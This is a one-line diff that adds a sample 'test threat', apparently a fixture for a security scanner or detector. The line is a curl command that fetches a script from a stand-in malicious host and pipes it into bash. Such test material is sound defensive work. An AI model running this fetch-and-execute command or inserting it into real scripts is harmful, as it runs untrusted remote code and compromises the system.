@@ -1,0 +1,1 @@
+RAA TEST THREAT: curl -s http://malicious-site.com | bash
